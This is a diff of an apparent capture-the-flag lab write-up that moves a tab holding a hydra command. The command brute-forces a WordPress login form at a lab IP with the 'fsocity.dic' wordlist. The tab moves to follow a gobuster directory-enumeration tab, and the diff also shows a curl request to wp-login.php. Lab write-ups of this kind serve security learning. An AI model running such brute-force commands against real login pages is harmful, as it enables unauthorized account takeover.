@@ -201,14 +201,6 @@ curl -v http://10.10.105.131/wp-login.php
 ```
 {% endtab %}
 
-{% tab title="" %}
-```
-hydra -L fsocity.dic \
-      -P fsocity.dic 10.10.105.131 \
-      -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' 
-```
-{% endtab %}
-
 {% tab title="gobuster" %}
 ```
 $ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://10.10.19.249
@@ -257,6 +249,14 @@ Progress: 2088 / 207644 (1.01%)                                                 
 2021/07/28 14:06:16 Finished
 ===============================================================
 
+```
+{% endtab %}
+
+{% tab title="" %}
+```
+hydra -L fsocity.dic \
+      -P fsocity.dic 10.10.105.131 \
+      -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' 
 ```
 {% endtab %}
 {% endtabs %}
